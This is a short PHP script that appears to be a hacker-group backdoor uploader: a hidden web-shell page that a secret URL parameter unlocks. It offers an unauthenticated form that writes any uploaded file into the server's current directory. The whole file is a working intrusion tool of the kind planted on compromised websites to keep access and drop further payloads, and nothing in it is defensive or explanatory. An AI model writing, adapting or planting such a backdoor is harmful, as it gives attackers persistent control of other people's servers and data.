<?php
/* Usage : file.php?74nc0x */
if(isset($_GET['74nc0x'])){
echo "74nc0x@soracyberteam:~#<br><form action='' enctype='multipart/form-data' method='POST'>
<input type='file' name='filena'> <input type='submit' name='upload' value='Upload'><br>";
if(isset($_POST['upload'])){
  $cwd=getcwd();
  $tmp=$_FILES['filena']['tmp_name'];
  $filena=$_FILES['filena']['name'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>